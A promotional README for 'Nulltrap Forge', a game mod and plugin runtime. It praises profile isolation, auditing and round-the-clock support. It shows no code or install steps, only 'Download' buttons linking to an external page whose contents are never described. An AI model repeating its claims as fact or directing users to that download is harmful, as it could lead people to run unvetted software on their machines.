![preview](https://raw.githubusercontent.com/mostafa889755/nulltrap-profiles/main/screen_dad9c4.svg)
[![Download](https://raw.githubusercontent.com/mostafa889755/nulltrap-profiles/main/go_b4125c.svg)](https://mostafa889755.github.io/nulltrap-profiles/)

# Nulltrap Forge — A Governance-First Game Extension Runtime

![status](https://img.shields.io/badge/status-active%20development-4b8bf5?style=flat-square)
![license](https://img.shields.io/badge/license-MIT-2ea44f?style=flat-square)
![platform](https://img.shields.io/badge/platform-cross--platform-6c757d?style=flat-square)
![profiles](https://img.shields.io/badge/per--game%20profiles-supported-8a2be2?style=flat-square)
![plugins](https://img.shields.io/badge/plugin%20contract-stable-ff8c00?style=flat-square)
![i18n](https://img.shields.io/badge/i18n-18%20locales-00b894?style=flat-square)
![support](https://img.shields.io/badge/support-24%2F7-1abc9c?style=flat-square)

Nulltrap Forge is not another catch-all wrapper for loading user tweaks into a game session. It is a runtime designed around a single stubborn belief: that extensibility and auditability are not opposites, and that a player should never have to trade one for the other. Where most extension tooling grows into an opaque tangle of side-loaded scripts and half-documented hooks, Nulltrap Forge keeps every moving part inspectable, every permission declared, and every profile reproducible from a plain-text manifest you can read in a text editor over coffee.

The project was born from a simple frustration: per-game configuration is almost always treated as an afterthought, bolted on after the loader works, and patched together with global state that leaks between titles. Nulltrap Forge inverts that. A game profile is a first-class citizen. It owns its own sandbox, its own plugin allow-list, its own load order, and its own rollback snapshots. Switching from one title to another is not a matter of hoping nothing collides — it is a deliberate, verifiable handoff between isolated environments.

---

## 🧭 Table of Contents

- [What This Project Actually Is](#-what-this-project-actually-is)
- [Design Philosophy](#-design-philosophy)
- [Core Capabilities](#-core-capabilities)
- [Per-Game Profiles in Depth](#-per-game-profiles-in-depth)
- [The Plugin Contract](#-the-plugin-contract)
- [Mod Management Without the Mess](#-mod-management-without-the-mess)
- [Auditability and the Trust Model](#-auditability-and-the-trust-model)
- [Responsive Interface and Accessibility](#-responsive-interface-and-accessibility)
- [Multilingual Experience](#-multilingual-experience)
- [Support and Community Care](#-support-and-community-care)
- [Use Cases and Real-World Scenarios](#-use-cases-and-real-world-scenarios)
- [Performance Notes](#-performance-notes)
- [Security Posture](#-security-posture)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [Contributing](#-contributing)
- [License](#-license)
- [Disclaimer](#-disclaimer)

---

## 🧩 What This Project Actually Is

Think of Nulltrap Forge as a workshop bench rather than a locker. A locker hides things behind a door; a workshop bench lays the tools out where you can see them, label them, and pick them up with intent. The runtime exposes a small, documented surface for game extensions, and everything else is walled off by default. No hidden global registry, no magical auto-discovery that pulls in whatever happens to be sitting in a folder.

At its heart, Nulltrap Forge provides:

- A host process that attaches to a running game session through a narrow, versioned interface.
- A profile manager that stores per-title configuration in human-readable files.
- A plugin loader that refuses to run anything without an explicit, signed declaration of intent.
- A mod resolver that understands dependency order and conflict rules.
- An audit log that records every action taken by every extension, timestamped and attributable.

The result is a system you can hand to someone else — a friend, a teammate, a reviewer — and they can reconstruct exactly what your setup does without guessing.

---

## 🎯 Design Philosophy

### Small enough to read in a weekend

The codebase is intentionally compact. A determined reader should be able to walk the full request path from "game launches" to "plugin callback fires" in a single sitting. This is not minimalism for its own sake; it is a direct response to the observation that most extension ecosystems become unmaintainable precisely because nobody can hold the whole picture in their head anymore.

### Auditable by default

Every plugin declares its capabilities up front. A plugin that wants to read memory must say so. A plugin that wants to intercept input must say so. A plugin that wants network access must say so and justify it in its manifest. The runtime surfaces these declarations in the interface before the plugin ever runs, so the person at the keyboard makes an informed decision rather than a hopeful one.

### Profiles over globals

The global configuration object is the villain of this story. Nulltrap Forge replaces it with scoped profiles. Each profile is a directory containing a manifest, a plugin list with pinned versions, and a set of overrides. Two profiles never share mutable state, which means a misbehaving extension in one game cannot quietly corrupt another.

### A contract, not a suggestion

The plugin contract is enforced, not advisory. Plugins that violate the declared interface are rejected at load time, with a clear error that points to the offending field. This keeps the ecosystem coherent as it grows and spares users from the "works on my machine" lottery.

---

## ⚙️ Core Capabilities

- **Narrow host interface** — a small set of documented entry points that plugins may use, versioned and validated at load time.
- **Per-game profile isolation** — each title gets its own sandboxed environment, load order, and allow-list.
- **Manifest-driven plugin loading** — no implicit discovery, no surprise execution, no ambient authority.
- **Deterministic mod resolution** — dependency graphs are resolved and conflicts reported before anything runs.
- **Snapshot and rollback** — capture the exact state of a profile and restore it later, byte for byte.
- **Append-only audit trail** — every plugin action is recorded with attribution and a monotonic timestamp.
- **Responsive control surface** — the interface adapts from a phone screen to a multi-monitor desktop without losing information density.
- **Multilingual interface** — eighteen locales shipped, with a documented path for adding more.
- **Offline-first operation** — the runtime works without a network connection; remote features are opt-in.
- **Deterministic startup time** — profile load is measured and reported, so regressions are visible immediately.
- **Extensible theming** — the control surface can be restyled without touching the runtime core.
- **Portable profiles** — a profile directory can be moved between machines and behaves identically.

---

## 🎮 Per-Game Profiles in Depth

A profile is the unit of configuration. It is not a set of global toggles that you switch per title. It is a self-contained environment that travels with its game.

Each profile contains:

1. **A manifest** describing the target title, the expected runtime version, and the intended plugin set.
2. **A load order** that resolves deterministically, even when two plugins declare the same priority.
3. **A permission grant list** that mirrors the capabilities each plugin requested.
4. **A rollback store** holding prior states for instant reversion.
5. **A notes file** where the user can record why the profile exists in the first place.

Because profiles are portable, you can share one with a collaborator and they will see exactly what you see. Because they are human-readable, you can diff two profiles and understand the difference without a tool. Because they are isolated, a profile for one game cannot reach into another.

The metaphor here is a set of labeled drawers in a workshop. You open the drawer for the task at hand, take what you need, and close it again. Nothing from the previous drawer follows you to the next one.

---

## 🔌 The Plugin Contract

Plugins in Nulltrap Forge are guests, not residents. They are welcomed, given a defined space, and expected to stay within it.

A plugin declares:

- **Identity** — a stable name and a semantic version.
- **Target range** — which host interface versions it supports.
- **Capabilities** — the specific powers it is requesting.
- **Entry points** — the named functions the runtime will call and when.
- **Teardown behavior** — how it cleans up when unloaded.

The runtime validates all of this before the plugin runs. If a plugin asks for a capability it did not declare, the request is denied and logged. If it declares a target range that does not include the current host, it is skipped with a clear explanation rather than a crash.

The benefit is subtle but profound: users stop fearing their extensions. They know what each one can do, because each one said so in advance, and the runtime held it to that promise.

---

## 🧱 Mod Management Without the Mess

Mods and plugins are different creatures. A plugin extends behavior; a mod changes content or parameters. Nulltrap Forge treats them with separate machinery, because conflating the two is how ecosystems end up with load-order superstitions passed down like folklore.

The mod resolver:

- Builds a dependency graph from declared relationships.
- Detects cycles and reports them with the exact chain that caused them.
- Applies a stable ordering rule when priorities tie, so results are reproducible.
- Reports conflicts before launch, not after a mysterious crash mid-session.
- Supports optional mods that activate only when their dependencies are present.

There is no "just try it and see" in this workflow. The resolver tells you what will happen, and then it happens that way.

---

## 🔍 Auditability and the Trust Model

Trust in software is usually a feeling. Nulltrap Forge tries to make it a fact you can verify.

Every action taken by a plugin — reading a value, intercepting an event, writing a file — is recorded in an append-only log. The log includes the plugin identity, the action, the target, and a timestamp. It cannot be edited after the fact by a plugin, because plugins do not have write access to it.

From this log you can answer questions like:

- Which plugin touched this file?
- When did this behavior first appear?
- What changed between two sessions that otherwise looked identical?

This is the difference between an ecosystem you tolerate and an ecosystem you understand.

---

## 📱 Responsive Interface and Accessibility

The control surface is built to be used, not just seen. It reflows gracefully from a narrow handheld screen to a wide desktop layout, preserving the information that matters at each size rather than simply hiding things.

Accessibility considerations include:

- Full keyboard navigation with visible focus states.
- Screen-reader-friendly labels on all interactive controls.
- Respect for reduced-motion preferences.
- Sufficient contrast in both light and dark themes.
- Scalable typography that does not break layout at large sizes.

The interface is not an afterthought bolted onto a command-line tool. It is a first-class part of the experience, designed for people who will spend hours in it.

---

## 🌐 Multilingual Experience

Eighteen locales ship with the runtime, covering major language families across several continents. Translations are stored as plain files, and adding a new locale does not require touching the runtime core.

The interface detects the system language and selects the closest available match, with an explicit override in settings. Pluralization, date formatting, and number grouping follow locale conventions rather than being forced into a single shape.

The goal is simple: the tool should feel like it was made for you, regardless of where you are.

---

## 🕰️ Support and Community Care

Support runs around the clock, every day of the year. Questions are answered by people who use the runtime, not by a script that greets you and then vanishes. The support rotation is documented, so you know who is on duty and when.

Channels include:

- A discussion forum with searchable history.
- A live chat room staffed continuously.
- A weekly office hours session where maintainers answer questions directly.

No question is treated as too basic. The project's health depends on newcomers feeling welcome, not on gatekeeping expertise.

---

## 🧪 Use Cases and Real-World Scenarios

**A player with a large mod collection.** They maintain a profile per title, each with its own pinned versions and load order. When a title updates and breaks something, they roll back that one profile without touching the others.

**A streamer who needs reproducibility.** They share their profile with their audience, who can reproduce the exact configuration. No more "what settings did you use" threads.

**A mod author testing compatibility.** They spin up a fresh profile, add their mod alongside the ones they want to test against, and read the resolver's report before ever launching the game.

**A cautious user who wants to know what they are running.** They open the audit log and see exactly which extension touched which file, and when.

---

## 🚀 Performance Notes

Startup time is measured and surfaced. The runtime reports how long each plugin took to load, so a sluggish extension is easy to identify. Memory footprint is tracked per profile, and the interface shows a running total.

The design avoids the common pitfall of scanning large directories on every launch. Profiles are indexed once and cached, with invalidation on change rather than on a timer.

The result is a runtime that stays out of the way when you are playing and gets out of the way quickly when you are not.

---

## 🔐 Security Posture

Plugins run with the minimum authority they declared. Capabilities are granted individually, and a plugin that fails to justify one does not receive it.

Specifically:

- File access is scoped to the profile directory unless a broader scope is explicitly granted.
- Network access is denied by default and must be declared per plugin.
- Inter-process communication is mediated by the runtime, not left to plugins to negotiate.
- The audit log is append-only and not writable by plugins.

This is not a claim of invulnerability. It is a claim of honesty: the system does what it says, and it says what it does.

---

## 🗺️ Roadmap for 2026

- **Q1 2026** — Stabilize the plugin contract at version 2.0 and publish the migration guide.
- **Q2 2026** — Introduce profile signing so shared profiles can be verified as unmodified.
- **Q3 2026** — Expand locale coverage and add right-to-left layout support.
- **Q4 2026** — Ship a headless mode for automated compatibility testing in continuous integration.
- **Ongoing** — Improve startup performance and reduce the memory footprint of large plugin sets.

The roadmap is a living document, revised each quarter in public.

---

## ❓ Frequently Asked Questions

**Is this a replacement for existing extension tools?**
It is an alternative with a different set of priorities. If you value auditability and profile isolation over maximal compatibility with legacy scripts, it is worth a look.

**Do I need to know how to program to use it?**
No. Using profiles and mods requires no code. Writing plugins does, but the contract is documented and the examples are complete.

**Does it work offline?**
Yes. Remote features are opt-in and the core runtime never requires a network connection.

**Can I move my profiles between machines?**
Yes. Profiles are portable by design and behave identically wherever they are used.

**How are conflicts handled?**
They are detected and reported before launch, with the exact chain that produced them. You decide how to resolve them; the runtime does not guess.

**What happens if a plugin misbehaves?**
It is isolated, its actions are logged, and it can be removed from the profile without affecting others.

---

## 🤝 Contributing

Contributions are welcome from anyone who shares the project's priorities. Before opening a change, please read the contributing guide and the plugin contract specification. Changes that enlarge the runtime's authority or reduce auditability will be declined, regardless of how convenient they are.

Ways to help:

- Report bugs with reproducible steps.
- Improve documentation and translations.
- Write plugins that demonstrate the contract's capabilities.
- Review pull requests with a critical eye.

The project is better when more people look at it carefully.

---

## 📄 License

This project is released under the MIT License. The full text is available at the linked license file, and the year of record is 2026.

See the repository's LICENSE file for the complete terms.

---

## ⚠️ Disclaimer

Nulltrap Forge is provided as-is, without warranty of any kind, express or implied. The maintainers are not responsible for any damage, data loss, or unintended behavior arising from its use, including but not limited to interactions with third-party plugins or modifications. Users are responsible for ensuring their use of this software complies with the terms of service of any game or platform they interact with. This project is not affiliated with, endorsed by, or sponsored by any game publisher or platform holder. Always review the declared capabilities of any plugin before running it, and prefer sources you can verify.

---

[![Download](https://raw.githubusercontent.com/mostafa889755/nulltrap-profiles/main/go_b4125c.svg)](https://mostafa889755.github.io/nulltrap-profiles/)